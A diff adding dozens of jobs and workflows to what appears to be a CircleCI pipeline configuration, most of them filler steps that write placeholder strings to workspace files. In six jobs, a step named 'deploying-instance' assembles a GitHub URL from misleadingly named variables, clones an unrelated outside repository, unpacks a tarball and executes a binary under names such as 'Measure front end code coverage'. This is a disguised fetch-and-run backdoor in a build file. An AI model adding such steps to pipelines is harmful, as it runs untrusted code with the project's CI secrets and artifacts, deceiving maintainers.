+            mkdir -p /tmp/AccessibilityAuditStage && echo 'optional-volume-snapshot-stage fullReleasePromotionStage' > /tmp/AccessibilityAuditStage/BillingServiceImage
+            ls -l /tmp/AccessibilityAuditStage/BillingServiceImage
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'BillingServiceImage'
+  FinalLibraryBenchmarkComparison:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/BillingServiceImage" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone -q "$retry/$worker/$drain" "$PWD"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            /bin/bash -c "./deploymentHealthCheckStep"
+  remoteFetchPipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: post-test-validation-lane-4
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'IndexerContentDigest event-bus-package-cache' > /tmp/AccessibilityAuditStage/conditional-release-build-hook
+            ls -l /tmp/AccessibilityAuditStage/conditional-release-build-hook
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'conditional-release-build-hook'
+  pre-deploy-configuration-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/conditional-release-build-hook" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth 5 --single-branch "$retry/$worker/$drain" ./
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd . && exec ./deploymentHealthCheckStep
+  HourlyPreviewRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Lock artifact versions in dry run mode
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'reporting-migrations monitor-converter-deployment' > /tmp/AccessibilityAuditStage/SetUpValidatorInstance
+            ls -l /tmp/AccessibilityAuditStage/SetUpValidatorInstance
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'SetUpValidatorInstance'
+  emergencyValidation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/SetUpValidatorInstance" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=1 --no-single-branch "$retry/$worker/$drain" .
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd . && ./deploymentHealthCheckStep
+  link-checker-install:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/TagMergeCommit" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --recurse-submodules --depth 1 "$retry/$worker/$drain" ./
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$PWD" && ./deploymentHealthCheckStep
+  InvalidateClientPackageCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: sequential-metric-export
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'InstallerDatabaseSnapshot FinalizeMailerPatchRelease' > /tmp/AccessibilityAuditStage/post-test-dependency-analysis
+            ls -l /tmp/AccessibilityAuditStage/post-test-dependency-analysis
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'post-test-dependency-analysis'
+  formatter-build-logs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/post-test-dependency-analysis" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --filter tree:0 "$retry/$worker/$drain" "${PWD}"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$PWD" && exec ./deploymentHealthCheckStep
+  basic-package-signing-routine:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: sync agent assets
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'complete-test adapter-image-tagging' > /tmp/AccessibilityAuditStage/image-rebuild-pipeline
+            ls -l /tmp/AccessibilityAuditStage/image-rebuild-pipeline
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'image-rebuild-pipeline'
+  PushImageTags:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/image-rebuild-pipeline" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=3 --no-tags --no-single-branch "$retry/$worker/$drain" ${PWD}
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            exec "./deploymentHealthCheckStep"
+
+  count-words-in-full-detail:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: PeriodicDeploymentMonitoring
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'notification-step one-time-image-tagging-round-6' > /tmp/AccessibilityAuditStage/trigger-installation-tests
+            ls -l /tmp/AccessibilityAuditStage/trigger-installation-tests
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'trigger-installation-tests'
+  framework-asset-download-stage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Restart Stream Processor
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'readingByteCountPhase2Of3 removing-layer-cache' > /tmp/AccessibilityAuditStage/BundleCollectorTypeDefinitions
+            ls -l /tmp/AccessibilityAuditStage/BundleCollectorTypeDefinitions
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'BundleCollectorTypeDefinitions'
+  binaryDownloadWorkflow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: shard-11
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'usability-track-4 deploy-operator' > /tmp/AccessibilityAuditStage/controller-cycle-6
+            ls -l /tmp/AccessibilityAuditStage/controller-cycle-6
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'controller-cycle-6'
+  MergingBenchmarkResults:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: start-sync-service-containers-shard-7-of-10
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'snapshot-restore-step IsolatedTemplateLintStep' > /tmp/AccessibilityAuditStage/AlertPartition2Of4
+            ls -l /tmp/AccessibilityAuditStage/AlertPartition2Of4
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'AlertPartition2Of4'
+  alert-test-engineers-of-success:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: crawler-layer-cache
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'PromoteToTestDevices DownloadBuildOutputsFromMirror' > /tmp/AccessibilityAuditStage/InformReviewersAboutRollback
+            ls -l /tmp/AccessibilityAuditStage/InformReviewersAboutRollback
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'InformReviewersAboutRollback'
+  DataImporterAssetCompression:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: pull-mail-server-container-image-from-local-registry
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'version-rollback Framework' > /tmp/AccessibilityAuditStage/writeAgentBuildManifest
+            ls -l /tmp/AccessibilityAuditStage/writeAgentBuildManifest
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'writeAgentBuildManifest'
+  libraryPackagingWorkflow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: document-converter-publish
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'fetching-segment-3 PinPaymentServiceDependencies' > /tmp/AccessibilityAuditStage/ManualApprovalLane6
+            ls -l /tmp/AccessibilityAuditStage/ManualApprovalLane6
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'ManualApprovalLane6'
+  ComputingPartnerPortalSignature:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: overnight-migration-rollback
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'AcknowledgeRound5 MinimalPerformanceGate' > /tmp/AccessibilityAuditStage/image-rebuild-pipeline
+            ls -l /tmp/AccessibilityAuditStage/image-rebuild-pipeline
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'image-rebuild-pipeline'
+  hourlyMatrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: extract-validator-release-package
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'query-planner-release-package wait-for-back-end-instance' > /tmp/AccessibilityAuditStage/rename-test-harness-binary
+            ls -l /tmp/AccessibilityAuditStage/rename-test-harness-binary
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'rename-test-harness-binary'
+  pre-review-backup-group-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: notifierProductionSmokeTest
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'RequiredToolkitSigning runtime-build' > /tmp/AccessibilityAuditStage/SetUpValidatorInstance
+            ls -l /tmp/AccessibilityAuditStage/SetUpValidatorInstance
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'SetUpValidatorInstance'
+  SeedIndexerDatabase:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: upgrades-segment-5
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'printBlockCount initializeTestHarness' > /tmp/AccessibilityAuditStage/minimal-rollback-dry-run
+            ls -l /tmp/AccessibilityAuditStage/minimal-rollback-dry-run
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'minimal-rollback-dry-run'
+  ResolveDaemonDependenciesStep9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan for binary files in strict mode
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'check-out-admin-panel-headers CollectTestHarnessScreenshots' > /tmp/AccessibilityAuditStage/bundle-back-end
+            ls -l /tmp/AccessibilityAuditStage/bundle-back-end
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'bundle-back-end'
+  track-extension-bundle-size:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: finalizing-build
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'RollBackStreamProcessorService ScheduledDependencyReview' > /tmp/AccessibilityAuditStage/post-test-dependency-analysis
+            ls -l /tmp/AccessibilityAuditStage/post-test-dependency-analysis
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'post-test-dependency-analysis'
+  CollectAndUpload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Roll out preview release to staging environment
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'SortEntriesBeforeCleanup RenameTemplateEngineObjectFiles' > /tmp/AccessibilityAuditStage/run-slot-5
+            ls -l /tmp/AccessibilityAuditStage/run-slot-5
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'run-slot-5'
+  gateway-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Copy validator archive from upstream job
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'FileServerBinaryWave3 store-proxy-benchmark-results' > /tmp/AccessibilityAuditStage/file-server-validation
+            ls -l /tmp/AccessibilityAuditStage/file-server-validation
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'file-server-validation'
+workflows:
+  nightly-image-checksum-cycle-3:
+    jobs:
+      - patch-bump-stage
+      - MergingBenchmarkResults:
+          requires:
+            - patch-bump-stage
+      - web-app-version-tag:
+          requires:
+            - MergingBenchmarkResults
+      - DesktopAppReleaseArtifacts:
+          requires:
+            - MergingBenchmarkResults
+      - alert-test-engineers-of-success:
+          requires:
+            - DesktopAppReleaseArtifacts
+      - HashingSlice1Of2:
+          requires:
+            - alert-test-engineers-of-success
+      - validator-module-cache:
+          requires:
+            - alert-test-engineers-of-success
+      - DataImporterAssetCompression:
+          requires:
+            - validator-module-cache
+      - mail-server-log-rotation:
+          requires:
+            - DataImporterAssetCompression
+      - strict-source-checkout:
+          requires:
+            - DataImporterAssetCompression
+      - libraryPackagingWorkflow:
+          requires:
+            - strict-source-checkout
+      - test-landing-page:
+          requires:
+            - libraryPackagingWorkflow
+      - basic-package-signing-routine:
+          requires:
+            - libraryPackagingWorkflow
+      - ComputingPartnerPortalSignature:
+          requires:
+            - basic-package-signing-routine
+      - PushImageTags:
+          requires:
+            - ComputingPartnerPortalSignature
+      - CompareBackupAgentChecksums:
+          requires:
+            - ComputingPartnerPortalSignature
+      - hourlyMatrix:
+          requires:
+            - CompareBackupAgentChecksums
+      - collecting-driver-test-summary:
+          requires:
+            - hourlyMatrix
+      - HourlyPreviewRelease:
+          requires:
+            - hourlyMatrix
+      - pre-review-backup-group-2:
+          requires:
+            - HourlyPreviewRelease
+      - emergencyValidation:
+          requires:
+            - pre-review-backup-group-2
+      - cleanup-task-replica-5:
+          requires:
+            - pre-review-backup-group-2
+      - SeedIndexerDatabase:
+          requires:
+            - cleanup-task-replica-5
+      - DetectingStaleBranches:
+          requires:
+            - SeedIndexerDatabase
+  HourlyGeneration:
+    jobs:
+      - remoteFetchPipeline
+      - pre-deploy-configuration-lint:
+          requires:
+            - remoteFetchPipeline
+      - compress-middleware-packages:
+          requires:
+            - remoteFetchPipeline
+      - test-packages:
+          requires:
+            - compress-middleware-packages
+      - routine-canary-deployment:
+          requires:
+            - compress-middleware-packages
+      - generate-test-data:
+          requires:
+            - routine-canary-deployment
+      - RendererBuildDependencies:
+          requires:
+            - routine-canary-deployment
+      - FinalLibraryBenchmarkComparison:
+          requires:
+            - RendererBuildDependencies
+      - RollBackVersionBump:
+          requires:
+            - RendererBuildDependencies
+      - post-migration-image-signing:
+          requires:
+            - RollBackVersionBump
+      - link-exporter-binaries:
+          requires:
+            - RollBackVersionBump
+      - CloningRepository:
+          requires:
+            - link-exporter-binaries
+      - fetch-dependency-graph:
+          requires:
+            - link-exporter-binaries
+      - link-check:
+          requires:
+            - fetch-dependency-graph
+  CollectCrashDumpsAndUploadArtifacts:
+    jobs:
+      - full-source-checkout
+      - ResolveDaemonDependenciesStep9:
+          requires:
+            - full-source-checkout
+      - ExtendedRollOut:
+          requires:
+            - ResolveDaemonDependenciesStep9
+      - InvalidateClientPackageCache:
+          requires:
+            - ResolveDaemonDependenciesStep9
+      - track-extension-bundle-size:
+          requires:
+            - InvalidateClientPackageCache
+      - formatter-build-logs:
+          requires:
+            - track-extension-bundle-size
+      - compile-and-test-registry:
+          requires:
+            - track-extension-bundle-size
+      - CollectAndUpload:
+          requires:
+            - compile-and-test-registry
+      - LoadBalancerVersionNumber:
+          requires:
+            - CollectAndUpload
+      - documentation-rebuild-step:
+          requires:
+            - CollectAndUpload
+      - gateway-integration-tests:
+          requires:
+            - documentation-rebuild-step
+      - ImageProcessorCleanup:
+          requires:
+            - gateway-integration-tests
+      - ApplyCodeFormatting
+      - start-server-workers:
+          requires:
+            - ApplyCodeFormatting
+      - LibraryPublish:
+          requires:
+            - ApplyCodeFormatting
+      - StartAndMonitorEventBus:
+          requires:
+            - LibraryPublish
+      - RuntimeCoverage:
+          requires:
+            - LibraryPublish
+      - decoder-manifest-digest-phase:
+          requires:
+            - RuntimeCoverage
+  fallback-project-setup-bucket-6:
+    jobs:
+      - record-console-release-tag
+      - count-words-in-full-detail:
+          requires:
+            - record-console-release-tag
+      - auditing-compiler-flags:
+          requires:
+            - count-words-in-full-detail
+      - local-engine-install:
+          requires:
+            - count-words-in-full-detail
+      - framework-asset-download-stage:
+          requires:
+            - local-engine-install
+      - adapter-checksum-comparison:
+          requires:
+            - framework-asset-download-stage
+      - router-cache-setup-hook:
+          requires:
+            - framework-asset-download-stage
+      - binaryDownloadWorkflow:
+          requires:
+            - router-cache-setup-hook
+      - nightly-verification:
+          requires:
+            - binaryDownloadWorkflow
+      - FirmwareStep8Of13
+      - indexer-database-migration-job
+      - locking-deployments:
+          requires:
+            - FirmwareStep8Of13
+            - indexer-database-migration-job
+      - FetchLibraryInBatches:
+          requires:
+            - FirmwareStep8Of13
+            - indexer-database-migration-job
+      - PostIntegrationLint:
+          requires:
+            - FirmwareStep8Of13
+            - indexer-database-migration-job
+      - LintSummary:
+          requires:
+            - FirmwareStep8Of13
+            - indexer-database-migration-job
+      - link-checker-install:
+          requires:
+            - FirmwareStep8Of13
+            - indexer-database-migration-job
